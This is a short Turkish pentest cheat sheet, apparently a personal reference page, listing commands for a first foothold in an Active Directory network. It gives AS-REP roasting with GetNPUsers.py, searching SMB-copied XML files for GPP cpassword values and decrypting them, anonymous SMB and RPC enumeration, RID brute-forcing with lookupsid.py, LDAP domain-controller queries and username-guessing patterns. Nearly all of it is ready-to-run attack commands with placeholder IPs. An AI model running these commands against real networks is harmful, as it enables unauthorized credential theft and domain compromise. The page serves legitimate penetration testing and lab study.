---
layout: page
title: "Ağ Ortamında İlk Yapılacak İşlemler"
permalink: /linux/aga-ilk-giris/
---
kullanıcılar rpcclient ile girilip enumdomusers ile çekilir.

```bash
GetNPUsers.py -no-pass test.local/ -usersfile users.txt -dc-ip 10.X.X.X -request
```

Smb Dosyaları mget ile linux makineye çekildiğinde: 
```bash
find . -name "*.xml" -exec grep -i "cpassword" {} \; -print

Ardından:

gpp-decrypt.py "ŞİFRE"
```

Dns ile bulamadıysan DC'nin hostname'i 
```bash
ldapsearch -x -H ldap://IP -D "username@hostname" -w "Passwd123" -b "DC=test,DC=local" "(primaryGroupID=516)" dNSHostName sAMAccountName
```

username-anarchy ile domainde olabilecğeini düşündüğün kullanıcı kombinasyonlarını 
first, flast,first.last, firstl

LDAP 636 portu açıksa şöyle bir komut deneyebilirsin:
```bash
LDAPTLS_REQCERT=never ldapsearch -x -H "ldaps://10.x.x.x:636" -b "" -s base "(objectClass=*)" namingContexts
```

smbclient anonim loginlerinde:
```bash
smbclient -L //10.x.x.x -U "" -N
smbclient -L //10.x.x.x -N
```

Rpcclient ile enumdomusers çekemdiysen şöyle bir şey yapabilirsin:
```bash
lookupsid.py 'test.local/guest'@test.local -no-pass
```
